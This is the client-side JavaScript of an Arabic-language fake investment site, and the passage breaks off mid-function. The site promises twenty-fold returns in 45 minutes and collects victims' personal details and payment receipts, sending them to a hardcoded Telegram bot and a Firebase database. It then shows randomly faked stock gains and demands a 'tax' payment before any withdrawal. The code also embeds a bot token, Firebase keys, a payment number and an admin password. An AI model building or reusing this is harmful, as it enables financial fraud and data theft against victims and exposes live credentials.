// ============================================================
//  FIREBASE CONFIG
// ============================================================
const firebaseConfig = {
    apiKey: "AIzaSyDNOp3GZ8K0jJt0KIOGLuFI0OHxH8E9bC0",
    authDomain: "investment-d8188.firebaseapp.com",
    databaseURL: "https://investment-d8188-default-rtdb.firebaseio.com",
    projectId: "investment-d8188",
    storageBucket: "investment-d8188.firebasestorage.app",
    messagingSenderId: "374326141140",
    appId: "1:374326141140:web:8c46b81b6115f975cf9b41",
    measurementId: "G-H5VCNDRPV7"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// ============================================================
//  CONSTANTS
// ============================================================
const STORAGE_KEY = 'invest_app_settings';
const TIMER_KEY = 'timer_start_time';
const PAGE_KEY = 'current_page';
const TIMER_DURATION = 45 * 60;
const TIMER_TOTAL = TIMER_DURATION;

const DEFAULT_PACKAGES = [
    { name: 'الباقة الأولى', price: 500, returnAmount: 10000, tax: 3000, duration: '45 دقيقة' },
    { name: 'الباقة الثانية', price: 1000, returnAmount: 25000, tax: 5000, duration: '45 دقيقة' },
    { name: 'الباقة الثالثة', price: 3000, returnAmount: 200000, tax: 10000, duration: '45 دقيقة' }
];
const DEFAULT_BOT_TOKEN = '8678479534:AAHpTfyDDc7yv6H72KVCSkTWwSro9yRuxtI';
const DEFAULT_CHAT_ID = '7599842679';
const DEFAULT_PAYMENT_NUMBER = '01220548545';
const ADMIN_PASSWORD = 'K9@bP3qW7#zX1';
const ADMIN_NAME = 'تداول فحل الفحول';
const ADMIN_PHONE = '010';
const ADMIN_AGE = '20';
const ADMIN_GOV = 'قنا';

let attemptsCount = parseInt(localStorage.getItem('admin_attempts') || '0');
let lockUntil = parseInt(localStorage.getItem('admin_lock_until') || '0');

// ============================================================
//  SETTINGS
// ============================================================
function loadSettings() {
    const stored = localStorage.getItem(STORAGE_KEY);
    if (stored) {
        try { return JSON.parse(stored); } catch (e) {}
    }
    return {
        botToken: DEFAULT_BOT_TOKEN,
        chatId: DEFAULT_CHAT_ID,
        paymentNumber: DEFAULT_PAYMENT_NUMBER,
        packages: JSON.parse(JSON.stringify(DEFAULT_PACKAGES))
    };
}

function saveSettings(settings) {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(settings));
    syncUI(settings);
}

function syncUI(settings) {
    const payDisplay = document.getElementById('paymentNumberDisplay');
    if (payDisplay) payDisplay.textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
    const taxPayDisplay = document.getElementById('taxPaymentNumber');
    if (taxPayDisplay) taxPayDisplay.textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
    renderUserPackages(settings);
    renderAdminPackages(settings);
    updateTaxDisplay(settings);
}

// ============================================================
//  FIREBASE SYNC
// ============================================================
async function saveToFirebase(settings) {
    try {
        await database.ref('settings').set(settings);
        showToast('✅ تم حفظ الإعدادات في Firebase');
        updateCloudStatus(true);
        return true;
    } catch (error) {
        showToast('❌ فشل الحفظ في Firebase: ' + error.message, 'warning');
        updateCloudStatus(false);
        return false;
    }
}

async function loadFromFirebase() {
    try {
        const snapshot = await database.ref('settings').once('value');
        const data = snapshot.val();
        if (data) {
            const current = loadSettings();
            const merged = { ...current, ...data };
            if (merged.packages && Array.isArray(merged.packages)) {
                saveSettings(merged);
                showToast('✅ تم تحميل الإعدادات من Firebase');
                return true;
            } else {
                showToast('⚠️ البيانات غير صحيحة، استخدم الإعدادات المحلية', 'warning');
                return false;
            }
        } else {
            showToast('ℹ️ لا توجد بيانات في Firebase، سيتم استخدام الإعدادات المحلية', 'info');
            return false;
        }
    } catch (error) {
        showToast('❌ فشل التحميل من Firebase: ' + error.message, 'warning');
        updateCloudStatus(false);
        return false;
    }
}

function updateCloudStatus(connected) {
    const box = document.getElementById('cloudStatusBox');
    const text = document.getElementById('cloudStatusText');
    if (connected) {
        box.className = 'status-box status-online';
        text.innerHTML = '🟢 متصل بـ Firebase';
    } else {
        box.className = 'status-box status-offline';
        text.innerHTML = '🔴 غير متصل بـ Firebase';
    }
}

// ============================================================
//  ORDERS (الطلبات)
// ============================================================
async function submitOrder(orderData) {
    try {
        const newOrderRef = database.ref('orders').push();
        await newOrderRef.set({
            ...orderData,
            status: 'pending',
            reason: '',
            timestamp: Date.now(),
            orderId: newOrderRef.key
        });
        return newOrderRef.key;
    } catch (error) {
        showToast('❌ فشل حفظ الطلب: ' + error.message, 'warning');
        return null;
    }
}

async function getOrders() {
    try {
        const snapshot = await database.ref('orders').once('value');
        const data = snapshot.val();
        if (data) {
            return Object.values(data);
        }
        return [];
    } catch (error) {
        console.error('خطأ في جلب الطلبات:', error);
        return [];
    }
}

async function getOrderByPhone(phone) {
    try {
        const snapshot = await database.ref('orders').orderByChild('phone').equalTo(phone).once('value');
        const data = snapshot.val();
        if (data) {
            return Object.values(data);
        }
        return [];
    } catch (error) {
        console.error('خطأ في البحث عن الطلب:', error);
        return [];
    }
}

async function updateOrderStatus(orderId, status, reason = '') {
    try {
        await database.ref(`orders/${orderId}`).update({ status, reason });
        showToast('✅ تم تحديث حالة الطلب');
        return true;
    } catch (error) {
        showToast('❌ فشل تحديث الطلب: ' + error.message, 'warning');
        return false;
    }
}

// ============================================================
//  BANNED USERS (الحظر)
// ============================================================
async function banUser(phone, ip) {
    try {
        await database.ref('banned').push({ phone, ip, timestamp: Date.now() });
        showToast('✅ تم حظر المستخدم');
        return true;
    } catch (error) {
        showToast('❌ فشل حظر المستخدم: ' + error.message, 'warning');
        return false;
    }
}

async function unbanUser(phone) {
    try {
        const snapshot = await database.ref('banned').orderByChild('phone').equalTo(phone).once('value');
        const data = snapshot.val();
        if (data) {
            const keys = Object.keys(data);
            for (let key of keys) {
                await database.ref(`banned/${key}`).remove();
            }
            showToast('✅ تم إلغاء حظر المستخدم');
            return true;
        } else {
            showToast('⚠️ هذا المستخدم غير محظور', 'warning');
            return false;
        }
    } catch (error) {
        showToast('❌ فشل إلغاء الحظر: ' + error.message, 'warning');
        return false;
    }
}

async function getBannedUsers() {
    try {
        const snapshot = await database.ref('banned').once('value');
        const data = snapshot.val();
        if (data) {
            return Object.values(data);
        }
        return [];
    } catch (error) {
        console.error('خطأ في جلب المحظورين:', error);
        return [];
    }
}

async function isUserBanned(phone, ip) {
    try {
        const banned = await getBannedUsers();
        return banned.some(u => u.phone === phone || u.ip === ip);
    } catch (error) {
        return false;
    }
}

// ============================================================
//  RENDER PACKAGES (المستخدم)
// ============================================================
function renderUserPackages(settings) {
    if (!settings) settings = loadSettings();
    const grid = document.getElementById('userPackageGrid');
    if (!grid) return;
    grid.innerHTML = '';
    settings.packages.forEach((pkg, idx) => {
        const label = document.createElement('label');
        label.className = 'package-option';
        const radio = document.createElement('input');
        radio.type = 'radio';
        radio.name = 'package';
        radio.value = `${pkg.name} - ${pkg.price}`;
        if (idx === 0) radio.checked = true;
        label.appendChild(radio);

        const info = document.createElement('div');
        info.className = 'package-info';
        info.innerHTML = `
            <span class="package-name"><i class="fas fa-tag"></i> ${pkg.name}</span>
            <span class="package-detail"><i class="fas fa-clock"></i> ${pkg.duration}</span>
            <span class="package-price">${pkg.returnAmount} ← ${pkg.price}</span>
        `;
        label.appendChild(info);
        grid.appendChild(label);

        radio.addEventListener('change', function() {
            document.querySelectorAll('.package-option').forEach(opt => opt.classList.remove('selected'));
            if (this.checked) this.closest('.package-option').classList.add('selected');
            const pkgName = this.value.split(' - ')[0];
            const found = settings.packages.find(p => p.name === pkgName);
            if (found) {
                sessionStorage.setItem('reg_tax', found.tax || 3000);
                updateTaxDisplay(settings);
            }
        });
        if (idx === 0) {
            label.classList.add('selected');
            sessionStorage.setItem('reg_tax', pkg.tax || 3000);
            updateTaxDisplay(settings);
        }
    });
}

// ============================================================
//  RENDER ADMIN PACKAGES
// ============================================================
function renderAdminPackages(settings) {
    if (!settings) settings = loadSettings();
    const container = document.getElementById('adminPackageList');
    if (!container) return;
    container.innerHTML = '';
    settings.packages.forEach((pkg, index) => {
        const div = document.createElement('div');
        div.className = 'admin-package-item';
        div.innerHTML = `
            <div class="pkg-info">
                <span><strong>${pkg.name}</strong></span>
                <span>💰 ${pkg.price}</span>
                <span>📈 ${pkg.returnAmount}</span>
                <span>🧾 ضريبة: ${pkg.tax || 0}</span>
                <span>⏳ ${pkg.duration}</span>
            </div>
            <div style="display:flex; gap:6px;">
                <button class="btn-sm btn-edit" data-index="${index}"><i class="fas fa-edit"></i> تعديل</button>
                <button class="btn-sm btn-del" data-index="${index}"><i class="fas fa-trash"></i> حذف</button>
            </div>
        `;
        container.appendChild(div);
    });

    container.querySelectorAll('.btn-edit').forEach(btn => {
        btn.addEventListener('click', function() {
            const idx = parseInt(this.dataset.index);
            const settings = loadSettings();
            const pkg = settings.packages[idx];
            if (!pkg) return;
            const newName = prompt('اسم الباقة:', pkg.name);
            if (newName === null) return;
            const newPrice = prompt('السعر:', pkg.price);
            if (newPrice === null) return;
            const newReturn = prompt('العائد:', pkg.returnAmount);
            if (newReturn === null) return;
            const newTax = prompt('الضريبة:', pkg.tax || 0);
            if (newTax === null) return;
            const newDuration = prompt('المدة (45 دقيقة):', pkg.duration);
            if (newDuration === null) return;
            settings.packages[idx] = {
                name: newName.trim() || pkg.name,
                price: parseFloat(newPrice) || pkg.price,
                returnAmount: parseFloat(newReturn) || pkg.returnAmount,
                tax: parseFloat(newTax) || 0,
                duration: newDuration.trim() || pkg.duration
            };
            saveSettings(settings);
            showToast('تم تعديل الباقة');
        });
    });

    container.querySelectorAll('.btn-del').forEach(btn => {
        btn.addEventListener('click', function() {
            const idx = parseInt(this.dataset.index);
            const settings = loadSettings();
            if (settings.packages.length <= 1) {
                showToast('لا يمكن حذف الباقة الأخيرة', 'warning');
                return;
            }
            if (!confirm('حذف الباقة؟')) return;
            settings.packages.splice(idx, 1);
            saveSettings(settings);
            showToast('تم حذف الباقة');
        });
    });
}

// ============================================================
//  تحديث الضريبة
// ============================================================
function updateTaxDisplay(settings) {
    const taxDisplay = document.getElementById('taxAmountDisplay');
    if (!taxDisplay) return;
    const pkgSelected = sessionStorage.getItem('reg_package');
    if (pkgSelected && settings) {
        const pkgName = pkgSelected.split(' - ')[0];
        const found = settings.packages.find(p => p.name === pkgName);
        if (found) {
            taxDisplay.textContent = found.tax || 3000;
            return;
        }
    }
    if (settings && settings.packages && settings.packages.length > 0) {
        taxDisplay.textContent = settings.packages[0].tax || 3000;
    } else {
        taxDisplay.textContent = 3000;
    }
}

// ============================================================
//  TOAST
// ============================================================
let toastTimeout;

function showToast(msg, type = 'success') {
    const toast = document.getElementById('toast');
    const msgEl = document.getElementById('toastMessage');
    msgEl.textContent = msg;
    toast.className = 'toast show';
    if (type === 'warning') {
        toast.style.borderColor = '#f5a342';
        toast.querySelector('i').className = 'fas fa-exclamation-circle';
        toast.querySelector('i').style.color = '#f5a342';
    } else if (type === 'info') {
        toast.style.borderColor = '#5b8def';
        toast.querySelector('i').className = 'fas fa-info-circle';
        toast.querySelector('i').style.color = '#5b8def';
    } else {
        toast.style.borderColor = 'rgba(255,215,0,0.15)';
        toast.querySelector('i').className = 'fas fa-check-circle';
        toast.querySelector('i').style.color = '#f5c842';
    }
    clearTimeout(toastTimeout);
    toastTimeout = setTimeout(() => {
        toast.classList.remove('show');
    }, 4000);
}

// ============================================================
//  NAVIGATION
// ============================================================
const pages = {
    landing: document.getElementById('page-landing'),
    register: document.getElementById('page-register'),
    payment: document.getElementById('page-payment'),
    timer: document.getElementById('page-timer'),
    adminPassword: document.getElementById('page-admin-password'),
    adminDashboard: document.getElementById('page-admin-dashboard'),
    orderStatus: document.getElementById('page-order-status'),
};

function showPage(pageId) {
    Object.values(pages).forEach(p => p.classList.remove('active'));
    const target = document.getElementById(pageId);
    if (target) target.classList.add('active');
    localStorage.setItem(PAGE_KEY, pageId);
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function restoreSavedPage() {
    const savedPage = localStorage.getItem(PAGE_KEY);
    if (savedPage && document.getElementById(savedPage)) {
        if (savedPage === 'page-timer') {
            const startTime = localStorage.getItem(TIMER_KEY);
            if (startTime) {
                const remaining = getRemainingSeconds();
                if (remaining > 0) {
                    showPage('page-timer');
                    restoreTimerBackground();
                    return true;
                } else {
                    localStorage.removeItem(TIMER_KEY);
                    localStorage.removeItem(PAGE_KEY);
                    showPage('page-landing');
                    return true;
                }
            } else {
                localStorage.removeItem(PAGE_KEY);
                showPage('page-landing');
                return true;
            }
        } else {
            showPage(savedPage);
            return true;
        }
    }
    return false;
}

// ============================================================
//  PAYMENT FLOW - زر "أذهب لتحويل الأموال"
// ============================================================
document.getElementById('goToRegisterBtn').addEventListener('click', () => {
    renderUserPackages();
    showPage('page-register');
});

document.getElementById('backToLandingBtn').addEventListener('click', () => {
    localStorage.removeItem(PAGE_KEY);
    showPage('page-landing');
});

document.getElementById('backToRegisterBtn').addEventListener('click', () => showPage('page-register'));

// ===== زر أذهب لتحويل الأموال (المُصلح) =====
document.getElementById('goToPaymentBtn').addEventListener('click', async function(e) {
    e.preventDefault();

    const name = document.getElementById('fullName').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const age = document.getElementById('age').value.trim();
    const gov = document.getElementById('governorate').value.trim();
    const pkgSelected = document.querySelector('input[name="package"]:checked');

    // التحقق من الحقول
    if (!name || !phone || !age || !gov) {
        showToast('يرجى ملء جميع الحقول', 'warning');
        return;
    }
    if (!pkgSelected) {
        showToast('يرجى اختيار الباقة', 'warning');
        return;
    }

    // التحقق من الحظر
    const isBanned = await isUserBanned(phone, '');
    if (isBanned) {
        showToast('🚫 تم حظرك من الموقع، لا يمكنك متابعة الطلب', 'warning');
        return;
    }

    // التحقق من دخول الأدمن (مخفي)
    const isAdmin = (name === ADMIN_NAME && phone === ADMIN_PHONE && age === ADMIN_AGE && gov === ADMIN_GOV);
    if (isAdmin) {
        const now = Date.now();
        if (now > lockUntil) {
            attemptsCount = 0;
            localStorage.setItem('admin_attempts', '0');
        }
        document.getElementById('attemptsLeft').textContent = Math.max(0, 10 - attemptsCount);
        document.getElementById('passwordError').textContent = '';
        document.getElementById('adminPasswordInput').value = '';
        showPage('page-admin-password');
        return;
    }

    // حفظ بيانات المستخدم في الجلسة
    sessionStorage.setItem('reg_name', name);
    sessionStorage.setItem('reg_phone', phone);
    sessionStorage.setItem('reg_age', age);
    sessionStorage.setItem('reg_gov', gov);
    sessionStorage.setItem('reg_package', pkgSelected.value);

    const pkgName = pkgSelected.value.split(' - ')[0];
    const settings = loadSettings();
    const found = settings.packages.find(p => p.name === pkgName);
    if (found) {
        sessionStorage.setItem('reg_tax', found.tax || 3000);
    }

    // تحديث رقم التحويل
    const paymentNumber = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
    document.getElementById('paymentNumberDisplay').textContent = paymentNumber;
    document.getElementById('taxPaymentNumber').textContent = paymentNumber;

    showPage('page-payment');
});

// ============================================================
//  COPY NUMBER
// ============================================================
document.getElementById('copyNumberBtn').addEventListener('click', function() {
    const num = document.getElementById('paymentNumberDisplay').textContent.trim();
    navigator.clipboard.writeText(num).then(() => {
        this.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
        showToast('تم نسخ الرقم');
        setTimeout(() => {
            this.innerHTML = '<i class="fas fa-copy"></i> نسخ';
        }, 2500);
    }).catch(() => {
        const el = document.createElement('textarea');
        el.value = num;
        document.body.appendChild(el);
        el.select();
        document.execCommand('copy');
        document.body.removeChild(el);
        showToast('تم نسخ الرقم');
    });
});

document.getElementById('taxCopyBtn')?.addEventListener('click', function() {
    const num = document.getElementById('taxPaymentNumber').textContent.trim();
    navigator.clipboard.writeText(num).then(() => {
        this.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
        showToast('تم نسخ الرقم');
        setTimeout(() => {
            this.innerHTML = '<i class="fas fa-copy"></i> نسخ';
        }, 2500);
    }).catch(() => {
        const el = document.createElement('textarea');
        el.value = num;
        document.body.appendChild(el);
        el.select();
        document.execCommand('copy');
        document.body.removeChild(el);
        showToast('تم نسخ الرقم');
    });
});

// ============================================================
//  FILE UPLOAD (payment)
// ============================================================
let uploadedFile = null;
const fileInput = document.getElementById('fileInput');
const uploadArea = document.getElementById('uploadArea');
const fileNameDisplay = document.getElementById('fileNameDisplay');

uploadArea.addEventListener('click', () => fileInput.click());
fileInput.addEventListener('change', function() {
    if (this.files.length > 0) {
        uploadedFile = this.files[0];
        fileNameDisplay.textContent = uploadedFile.name;
        uploadArea.style.borderColor = '#f5c842';
        uploadArea.style.background = 'rgba(245,200,66,0.05)';
    } else {
        uploadedFile = null;
        fileNameDisplay.textContent = 'لم يتم اختيار ملف';
        uploadArea.style.borderColor = 'rgba(255,215,0,0.15)';
        uploadArea.style.background = 'rgba(255,255,255,0.02)';
    }
});

// ============================================================
//  SUBMIT ORDER + START TIMER
// ============================================================
document.getElementById('submitAllBtn').addEventListener('click', async function() {
    const settings = loadSettings();
    const botToken = settings.botToken || DEFAULT_BOT_TOKEN;
    const chatId = settings.chatId || DEFAULT_CHAT_ID;

    const name = sessionStorage.getItem('reg_name') || 'غير محدد';
    const phone = sessionStorage.getItem('reg_phone') || 'غير محدد';
    const age = sessionStorage.getItem('reg_age') || 'غير محدد';
    const gov = sessionStorage.getItem('reg_gov') || 'غير محدد';
    const pkg = sessionStorage.getItem('reg_package') || 'غير محدد';
    const tax = sessionStorage.getItem('reg_tax') || 3000;

    if (!uploadedFile) {
        showToast('يرجى رفع صورة التحويل أولاً', 'warning');
        return;
    }

    const orderData = {
        name,
        phone,
        age,
        governorate: gov,
        package: pkg,
        tax: tax,
        timestamp: Date.now(),
        status: 'pending',
        reason: '',
    };
    const orderId = await submitOrder(orderData);
    if (!orderId) {
        showToast('❌ فشل حفظ الطلب، حاول مرة أخرى', 'warning');
        return;
    }

    const message =
        `📋 *طلب جديد*%0A` +
        `👤 الاسم: ${name}%0A` +
        `📱 الهاتف: ${phone}%0A` +
        `🎂 السن: ${age}%0A` +
        `📍 المحافظة: ${gov}%0A` +
        `📦 الباقة: ${pkg}%0A` +
        `💰 الضريبة: ${tax} جنيه%0A` +
        `🆔 رقم الطلب: ${orderId}%0A` +
        `🕒 تم الإرسال: ${new Date().toLocaleString('ar-EG')}`;

    try {
        const textUrl =
            `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
        await fetch(textUrl);
    } catch (e) { console.log('فشل إرسال التيليجرام'); }

    showToast('✅ تم إرسال طلبك بنجاح! جاري الاستثمار...', 'success');
    sessionStorage.setItem('orderId', orderId);
    startTimerBackground();
    showPage('page-timer');
});

// ============================================================
//  TIMER BACKGROUND
// ============================================================
function startTimerBackground() {
    const startTime = Date.now();
    localStorage.setItem(TIMER_KEY, startTime.toString());
    localStorage.removeItem('timer_completed');
    updateTimerDisplay();
    if (window.timerInterval) clearInterval(window.timerInterval);
    window.timerInterval = setInterval(updateTimerDisplay, 1000);
}

function getRemainingSeconds() {
    const startTime = parseInt(localStorage.getItem(TIMER_KEY));
    if (!startTime) return TIMER_TOTAL;
    const elapsed = (Date.now() - startTime) / 1000;
    const remaining = Math.max(0, TIMER_TOTAL - elapsed);
    return remaining;
}

function updateTimerDisplay() {
    const timerDisplay = document.getElementById('timerDisplay');
    const progressFill = document.getElementById('progressFill');
    const timerResult = document.getElementById('timerResult');

    if (!timerDisplay) return;

    const remaining = getRemainingSeconds();
    const mins = Math.floor(remaining / 60);
    const secs = Math.floor(remaining % 60);
    timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
    progressFill.style.width = `${(remaining / TIMER_TOTAL) * 100}%`;

    if (remaining <= 0) {
        timerDisplay.textContent = '00:00';
        progressFill.style.width = '0%';
        showTradingResult();
        localStorage.setItem('timer_completed', 'true');
        localStorage.removeItem(TIMER_KEY);
        if (window.timerInterval) {
            clearInterval(window.timerInterval);
            window.timerInterval = null;
        }
    }
}

function restoreTimerBackground() {
    if (localStorage.getItem('timer_completed') === 'true') {
        document.getElementById('timerDisplay').textContent = '00:00';
        document.getElementById('progressFill').style.width = '0%';
        showTradingResult();
        return;
    }

    const startTime = localStorage.getItem(TIMER_KEY);
    if (startTime) {
        const remaining = getRemainingSeconds();
        if (remaining <= 0) {
            document.getElementById('timerDisplay').textContent = '00:00';
            document.getElementById('progressFill').style.width = '0%';
            localStorage.setItem('timer_completed', 'true');
            localStorage.removeItem(TIMER_KEY);
            showTradingResult();
        } else {
            if (window.timerInterval) clearInterval(window.timerInterval);
            window.timerInterval = setInterval(updateTimerDisplay, 1000);
            updateTimerDisplay();
        }
    }
}

// ============================================================
//  عرض نتيجة التداول (صفحة الأسهم)
// ============================================================
function showTradingResult() {
    const container = document.getElementById('timerResult');
    if (!container) return;

    const name = sessionStorage.getItem('reg_name') || 'مستخدم';
    const tax = sessionStorage.getItem('reg_tax') || 3000;

    const stocks = [
        { symbol: 'AAPL', price: (180 + Math.random() * 20).toFixed(2), change: (Math.random() * 10 + 2).toFixed(1) },
        { symbol: 'GOOGL', price: (140 + Math.random() * 15).toFixed(2), change: (Math.random() * 8 + 1).toFixed(1) },
        { symbol: 'AMZN', price: (200 + Math.random() * 25).toFixed(2), change: (Math.random() * 12 + 3).toFixed(1) },
        { symbol: 'TSLA', price: (380 + Math.random() * 40).toFixed(2), change: (Math.random() * 15 + 5).toFixed(1) },
        { symbol: 'BTC', price: (65000 + Math.random() * 4000).toFixed(0), change: (Math.random() * 8 + 2).toFixed(1) },
        { symbol: 'ETH', price: (3700 + Math.random() * 400).toFixed(0), change: (Math.random() * 7 + 1).toFixed(1) }
    ];

    let stocksHTML = '<div class="stocks-grid">';
    stocks.forEach(s => {
        const isUp = parseFloat(s.change) > 0;
        stocksHTML += `
            <div class="stock-card ${isUp ? 'up' : 'down'}">
                <div class="stock-symbol">${s.symbol}</div>
                <div class="stock-price">$${s.price}</div>
                <div class="stock-change">
                    <i class="fas fa-arrow-${isUp ? 'up' : 'down'}"></i> ${s.change}%
                </div>
            </div>
        `;
    });
    stocksHTML += '</div>';

    container.innerHTML = `
        <div style="font-size:2.2rem; margin-bottom:8px;">
            <span class="confetti">🎉</span>
            <span style="color:#f5c842;"> مرحباً ${name}!</span>
            <span class="confetti">🎉</span>
        </div>
        <p style="color:#b0c4e0; margin-bottom:10px;">نتائج التداول لهذا اليوم</p>
        ${stocksHTML}
        <div class="tax-box">
            <h3><i class="fas fa-gem" style="color:#f5c842;"></i> ادفع الضريبة</h3>
            <p style="font-size:1.1rem; color:#f5c842; font-weight:700; margin:8px 0;">
                <span id="taxAmountDisplay">${tax}</span> جنيه لسحب فلوسك من الموقع
            </p>
            <p style="color:#b0c4e0; font-size:0.9rem;">قم بتحويل المبلغ على الرقم التالي:</p>
            <div class="payment-number-box" style="margin:10px 0 14px; background:rgba(255,255,255,0.06);">
                <span class="payment-number" id="taxPaymentNumber">${loadSettings().paymentNumber || DEFAULT_PAYMENT_NUMBER}</span>
                <button class="copy-btn" id="taxCopyBtn">
                    <i class="fas fa-copy"></i> نسخ
                </button>
            </div>
            <div class="upload-area" id="taxUploadArea" style="margin:6px 0 14px; padding:18px;">
                <i class="fas fa-receipt"></i>
                <p>رفع صورة إيصال التحويل</p>
                <div class="file-name" id="taxFileNameDisplay">لم يتم اختيار ملف</div>
            </div>
            <input type="file" id="taxFileInput" accept="image/*" />
            <button class="btn-primary btn-gold" id="submitTaxBtn" style="width:100%; justify-content:center; margin-top:6px;">
                <i class="fas fa-paper-plane"></i> إرسال إيصال الضريبة
            </button>
        </div>
        <div style="margin-top:12px; font-size:0.8rem; color:#5e6f8a;">
            <i class="fas fa-info-circle"></i> سيتم تحديث حالة طلبك في قسم "تتبع طلبك"
        </div>
    `;

    // إعادة ربط الأحداث
    const taxCopyBtn = document.getElementById('taxCopyBtn');
    if (taxCopyBtn) {
        taxCopyBtn.addEventListener('click', function() {
            const num = document.getElementById('taxPaymentNumber').textContent.trim();
            navigator.clipboard.writeText(num).then(() => {
                this.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
                showToast('تم نسخ الرقم');
                setTimeout(() => {
                    this.innerHTML = '<i class="fas fa-copy"></i> نسخ';
                }, 2500);
            }).catch(() => {
                const el = document.createElement('textarea');
                el.value = num;
                document.body.appendChild(el);
                el.select();
                document.execCommand('copy');
                document.body.removeChild(el);
                showToast('تم نسخ الرقم');
            });
        });
    }

    // ربط رفع صورة الضريبة
    const taxFileInput = document.getElementById('taxFileInput');
    const taxUploadArea = document.getElementById('taxUploadArea');
    const taxFileNameDisplay = document.getElementById('taxFileNameDisplay');
    if (taxUploadArea) {
        taxUploadArea.addEventListener('click', () => taxFileInput.click());
        taxFileInput.addEventListener('change', function() {
            if (this.files.length > 0) {
                window.taxFile = this.files[0];
                taxFileNameDisplay.textContent = window.taxFile.name;
                taxUploadArea.style.borderColor = '#f5c842';
                taxUploadArea.style.background = 'rgba(245,200,66,0.05)';
            } else {
                window.taxFile = null;
                taxFileNameDisplay.textContent = 'لم يتم اختيار ملف';
                taxUploadArea.style.borderColor = 'rgba(255,215,0,0.15)';
                taxUploadArea.style.background = 'rgba(255,255,255,0.02)';
            }
        });
    }
}

// ============================================================
//  TAX SUBMIT (الضريبة)
// ============================================================
let taxFile = null;
const taxFileInputGlobal = document.getElementById('taxFileInput');
const taxUploadAreaGlobal = document.getElementById('taxUploadArea');
const taxFileNameDisplayGlobal = document.getElementById('taxFileNameDisplay');

if (taxUploadAreaGlobal) {
    taxUploadAreaGlobal.addEventListener('click', () => taxFileInputGlobal.click());
    taxFileInputGlobal.addEventListener('change', function() {
        if (this.files.length > 0) {
            taxFile = this.files[0];
            taxFileNameDisplayGlobal.textContent = taxFile.name;
            taxUploadAreaGlobal.style.borderColor = '#f5c842';
            taxUploadAreaGlobal.style.background = 'rgba(245,200,66,0.05)';
        } else {
            taxFile = null;
            taxFileNameDisplayGlobal.textContent = 'لم يتم اختيار ملف';
            taxUploadAreaGlobal.style.borderColor = 'rgba(255,215,0,0.15)';
            taxUploadAreaGlobal.style.background = 'rgba(255,255,255,0.02)';
        }
    });
}

document.getElementById('submitTaxBtn')?.addEventListener('click', async function() {
    const settings = loadSettings();
    const botToken = settings.botToken || DEFAULT_BOT_TOKEN;
    const chatId = settings.chatId || DEFAULT_CHAT_ID;

    const name = sessionStorage.getItem('reg_name') || 'غير محدد';
    const taxAmount = sessionStorage.getItem('reg_tax') || 3000;
    const orderId = sessionStorage.getItem('orderId');

    if (!taxFile) {
        showToast('يرجى رفع صورة إيصال الضريبة', 'warning');
        return;
    }

    if (orderId) {
        await database.ref(`orders/${orderId}`).update({ taxImageUploaded: true, taxAmount });
    }

    const message =
        `💰 *إيصال الضريبة*%0A` +
        `👤 الاسم: ${name}%0A` +
        `💵 المبلغ المحول: ${taxAmount} جنيه%0A` +
        `🆔 رقم الطلب: ${orderId || 'غير معروف'}%0A` +
        `🕒 تم الإرسال: ${new Date().toLocaleString('ar-EG')}`;

    try {
        const textUrl =
            `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
        await fetch(textUrl);

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', taxFile);
        formData.append('caption', `📎 إيصال ضريبة - ${name} - ${taxAmount} جنيه`);
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        showToast('✅ تم إرسال إيصال الضريبة بنجاح!', 'success');
        taxFile = null;
        taxFileNameDisplayGlobal.textContent = 'لم يتم اختيار ملف';
        taxUploadAreaGlobal.style.borderColor = 'rgba(255,215,0,0.15)';
        taxUploadAreaGlobal.style.background = 'rgba(255,255,255,0.02)';
        taxFileInputGlobal.value = '';

    } catch (err) {
        showToast('❌ خطأ في الإرسال: ' + err.message, 'warning');
    }
});

// ============================================================
//  ADMIN PASSWORD
// ============================================================
document.getElementById('backToRegisterFromPass').addEventListener('click', () => showPage('page-register'));

document.getElementById('resetAttemptsBtn').addEventListener('click', function() {
    attemptsCount = 0;
    lockUntil = 0;
    localStorage.setItem('admin_attempts', '0');
    localStorage.setItem('admin_lock_until', '0');
    document.getElementById('attemptsLeft').textContent = '10';
    document.getElementById('passwordError').textContent = '✅ تم إعادة تعيين المحاولات';
    showToast('تم إعادة تعيين المحاولات', 'info');
});

document.getElementById('adminPasswordSubmitBtn').addEventListener('click', function() {
    const input = document.getElementById('adminPasswordInput').value.trim();
    const now = Date.now();

    if (now < lockUntil) {
        const remaining = Math.ceil((lockUntil - now) / 60000);
        document.getElementById('passwordError').textContent =
            `⛔ تم تجاوز عدد المحاولات. انتظر ${remaining} دقيقة قبل المحاولة مرة أخرى.`;
        return;
    }

    if (input === ADMIN_PASSWORD) {
        attemptsCount = 0;
        localStorage.setItem('admin_attempts', '0');
        localStorage.setItem('admin_lock_until', '0');
        document.getElementById('passwordError').textContent = '';
        showPage('page-admin-dashboard');
        loadAdminDashboard();
        showToast('مرحباً أيها الأدمن', 'success');
    } else {
        attemptsCount++;
        localStorage.setItem('admin_attempts', attemptsCount.toString());
        const left = Math.max(0, 10 - attemptsCount);
        document.getElementById('attemptsLeft').textContent = left;

        if (attemptsCount >= 10) {
            lockUntil = Date.now() + 3600000;
            localStorage.setItem('admin_lock_until', lockUntil.toString());
            document.getElementById('passwordError').textContent =
                '🚫 تم تجاوز 10 محاولات. تم حظر الدخول لمدة ساعة.';
            document.getElementById('attemptsLeft').textContent = '0';
        } else {
            document.getElementById('passwordError').textContent =
                `❌ كلمة المرور غير صحيحة. متبقي ${left} محاولات.`;
        }
        document.getElementById('adminPasswordInput').value = '';
        document.getElementById('adminPasswordInput').focus();
    }
});

// ============================================================
//  ADMIN LOGOUT
// ============================================================
document.getElementById('adminLogoutBtn').addEventListener('click', function() {
